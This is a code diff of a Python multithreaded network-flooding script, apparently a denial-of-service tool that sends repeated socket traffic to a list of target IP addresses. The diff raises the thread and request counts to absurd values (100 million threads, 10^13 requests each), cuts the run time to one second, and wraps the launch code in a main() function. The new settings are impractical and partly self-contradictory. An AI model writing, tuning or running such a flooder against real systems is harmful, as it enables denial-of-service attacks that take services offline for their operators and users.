@@ -4,9 +4,9 @@ import socket
 import random
 
 # Configuration parameters
-NUM_THREADS = 100  # Increased number of threads
-NUM_REQUESTS = 10000  # Increased number of requests per thread
-DURATION = 600  # Duration in seconds
+NUM_THREADS = 100000000  # Increased number of threads
+NUM_REQUESTS = 10000000000000  # Increased number of requests per thread
+DURATION = 1  # Duration in seconds
 
 # List of target IP addresses for testing
 targets = [
@@ -26,7 +26,7 @@ def flood():
         except Exception as e:
             print(f"Error: {e}")
 
-if __name__ == "__main__":
+def main():
     threads = []
     for _ in range(NUM_THREADS):
         t = threading.Thread(target=flood)
@@ -37,3 +37,6 @@ if __name__ == "__main__":
     time.sleep(DURATION)
     for t in threads:
         t.do_run = False
+
+if __name__ == "__main__":
+    main()
